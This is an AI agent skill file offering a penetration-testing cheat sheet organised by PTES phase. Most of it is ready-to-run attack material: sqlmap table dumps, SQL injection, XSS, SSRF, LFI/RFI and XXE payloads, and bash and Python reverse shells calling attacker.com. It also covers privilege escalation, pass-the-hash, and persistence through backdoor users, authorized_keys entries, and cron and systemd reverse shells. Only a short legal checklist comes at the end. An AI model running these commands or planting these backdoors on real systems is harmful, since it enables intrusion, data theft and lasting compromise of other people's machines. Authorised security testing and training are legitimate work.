---
name: penetration-testing
description: Offensive security, penetration testing, and vulnerability exploitation. Use when conducting security assessments, red team exercises, web application pentesting, network exploitation, or learning ethical hacking techniques. Covers PTES methodology, reconnaissance, exploitation, post-exploitation, and reporting.
metadata:
  tags:
  - security
  - pentest
  - exploitation
  - red-team
  - ethical-hacking
  version: 1.0.0
---

# Penetration Testing

Offensive security skill for ethical hacking, vulnerability exploitation, and security assessment. Covers the full penetration testing lifecycle from reconnaissance to reporting.

> "The best defense is a good offense." — Know your enemy to protect yourself.

---

## 🎯 When to Use

- Conducting security assessments or penetration tests
- Learning ethical hacking techniques
- Red team exercises
- Bug bounty hunting
- Vulnerability research and exploitation
- Security awareness training

---

## 🗺️ PTES Methodology Overview

```
Phase 1: Pre-Engagement Interactions
    └─ Scope definition, rules of engagement, legal agreements

Phase 2: Intelligence Gathering (Reconnaissance)
    └─ OSINT, passive/active recon, target enumeration

Phase 3: Threat Modeling
    └─ Identify high-value targets, attack vectors

Phase 4: Vulnerability Analysis
    └─ Automated scanning, manual verification

Phase 5: Exploitation
    └─ Gain access, prove impact

Phase 6: Post-Exploitation
    └─ Privilege escalation, lateral movement, persistence

Phase 7: Reporting
    └─ Executive summary, technical findings, remediation
```

---

## 🔍 Phase 2: Reconnaissance

### Passive Reconnaissance (OSINT)

```bash
# Subdomain enumeration
subfinder -d example.com -o subdomains.txt
amass enum -d example.com -o amass.txt
assetfinder --subs-only example.com

# DNS enumeration
dnsrecon -d example.com -t axfr
dnsenum example.com

# WHOIS & metadata
whois example.com
theHarvester -d example.com -b all

# GitHub recon (secrets, credentials)
git-dumper https://github.com/org/repo ./repo
truffleHog --regex --entropy=False https://github.com/org/repo

# Google dorks
site:example.com filetype:pdf
site:example.com intitle:"index of"
intext:"password" site:example.com
```

### Active Reconnaissance

```bash
# Port scanning
nmap -sS -sV -O -p- --top-ports 1000 target.com
nmap -sV --script=vuln target.com

# Service enumeration
nmap -sV -p 80,443,8080 --script=http-enum target.com
nmap -sV -p 21,22,23,25,53,80,110,143,443,3306,3389,5432,8080 target.com

# Web technology detection
whatweb target.com
wappalyzer target.com

# Directory/file brute-forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
dirb http://target.com /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

---

## 🔬 Phase 4: Vulnerability Analysis

### Web Application Scanning

```bash
# Automated scanning
nikto -h http://target.com
zaproxy -cmd -quickurl http://target.com -quickout report.html

# CMS scanning
wpscan --url http://target.com --enumerate ap,at,cb,dbe
joomscan -u http://target.com
droopescan scan drupal -u http://target.com

# SSL/TLS testing
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com
```

### Manual Verification

```bash
# Check for common misconfigurations
curl -I http://target.com/robots.txt
curl -I http://target.com/.git/config
curl -I http://target.com/.env
curl -I http://target.com/backup.zip
curl -I http://target.com/phpinfo.php

# HTTP methods testing
curl -X OPTIONS http://target.com -i
curl -X PUT http://target.com/test.txt -d "test"

# CORS misconfiguration
curl -H "Origin: https://evil.com" -I http://target.com
```

---

## 💥 Phase 5: Exploitation

### SQL Injection

```bash
# Detection
sqlmap -u "http://target.com/page.php?id=1" --batch --level=2
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
sqlmap -u "http://target.com/page.php?id=1" -D database --tables --batch
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --batch

# Manual testing
# Error-based
' OR 1=1 -- -
" OR 1=1 -- -
') OR ('1'='1

# Union-based
' UNION SELECT null,null,null -- -
' UNION SELECT username,password,null FROM users -- -

# Blind (time-based)
' OR SLEEP(5) -- -
' OR pg_sleep(5) -- -
```

### Cross-Site Scripting (XSS)

```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Stored XSS -->
"><script>alert('XSS')</script>
'--><script>alert('XSS')</script>

<!-- DOM-based XSS -->
#<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Command Injection

```bash
# Basic detection
target.com/page?cmd=whoami
target.com/page?cmd=$(whoami)
target.com/page?cmd=`whoami`

# Reverse shell (if command injection confirmed)
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF
curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
curl http://target.com/fetch?url=file:///etc/passwd

# Bypass filters
curl http://target.com/fetch?url=http://0177.0.0.1/
curl http://target.com/fetch?url=http://2130706433/
curl http://target.com/fetch?url=http://0x7f000001/
```

### Local File Inclusion (LFI) / Remote File Inclusion (RFI)

```bash
# LFI
http://target.com/page?file=../../../etc/passwd
http://target.com/page?file=../../../../../../etc/passwd
http://target.com/page?file=php://filter/read=convert.base64-encode/resource=index.php

# RFI
http://target.com/page?file=http://attacker.com/shell.txt
```

### XML External Entity (XXE)

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- OOB XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>&data;</foo>
```

---

## 🏴 Phase 6: Post-Exploitation

### Privilege Escalation (Linux)

```bash
# Information gathering
id
whoami
uname -a
cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
find / -perm -2000 -type f 2>/dev/null  # SGID binaries
cat /etc/sudoers
crontab -l

# Common exploits
# Kernel exploits
uname -r  # Check kernel version
searchsploit linux kernel $(uname -r)

# SUID exploitation
# If find has SUID: find . -exec /bin/sh -p \; -quit
# If vim has SUID: vim -c ':!/bin/sh'
# If less has SUID: less /etc/passwd -> !/bin/sh

# Sudo abuse
sudo -l
# If sudo allows specific commands without password
sudo -u#-1 /bin/bash  # CVE-2019-14287

# Capabilities
capsh --print
getcap -r / 2>/dev/null
```

### Privilege Escalation (Windows)

```powershell
# Information gathering
whoami /all
systeminfo
net user
net localgroup administrators
Get-Process
Get-Service

# Common exploits
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# If path has spaces and no quotes: C:\Program Files\Vuln Service\service.exe
# Place payload at C:\Program.exe

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If enabled: msiexec /quiet /qn /i C:\Users\Public\payload.msi

# Potato family exploits (NTLM relay)
# JuicyPotato, RoguePotato, SweetPotato
```

### Lateral Movement

```bash
# Pass-the-hash (PTH)
pth-smbclient -U user%hash //target/share
pth-winexe -U user%hash //target cmd

# Pass-the-ticket (PTT)
# Extract ticket with Mimikatz, inject with Rubeus

# SSH key pivoting
# If you find private keys: ssh -i id_rsa user@target

# Port forwarding
ssh -L 8080:internal-target:80 user@pivot-host
ssh -D 1080 user@pivot-host  # SOCKS proxy
```

### Persistence

```bash
# Linux
# Add user
useradd -m -s /bin/bash backdoor
passwd backdoor

# SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor

# Windows
# Registry run key
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 1

# WMI persistence
# Use PowerShell Empire or Cobalt Strike for WMI events
```

---

## 📊 Phase 7: Reporting

### Report Structure

```
1. Executive Summary
   - Risk rating (Critical/High/Medium/Low)
   - Business impact
   - Key recommendations

2. Technical Findings
   For each vulnerability:
   - Title & Severity (CVSS v3.1)
   - Description
   - Proof of Concept (PoC)
   - Impact
   - Remediation

3. Appendices
   - Tools used
   - Scope & methodology
   - Test timeline
```

### CVSS v3.1 Scoring

| Severity | Score Range | Response Time |
|----------|-------------|---------------|
| Critical | 9.0-10.0 | Immediate |
| High | 7.0-8.9 | 30 days |
| Medium | 4.0-6.9 | 60 days |
| Low | 0.1-3.9 | 90 days |

---

## 🛠️ Essential Tools

| Category | Tools |
|----------|-------|
| **Recon** | subfinder, amass, theHarvester, dnsrecon, whois |
| **Scanning** | nmap, masscan, rustscan |
| **Web** | Burp Suite, ZAP, nikto, gobuster, ffuf, sqlmap |
| **Exploitation** | Metasploit, Cobalt Strike, Sliver |
| **Post-Exploitation** | Mimikatz, Rubeus, BloodHound, SharpHound |
| **Reporting** | Dradis, Faraday, DefectDojo |

---

## ⚠️ Legal & Ethical Guidelines

- **Always** have written authorization before testing
- **Never** test systems you don't own or have permission to test
- **Minimize** impact on target systems
- **Report** findings responsibly
- **Destroy** all data collected after engagement

---

## 📚 References

- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Penetration Testing: A Hands-On Introduction to Hacking](https://nostarch.com/pentesting)
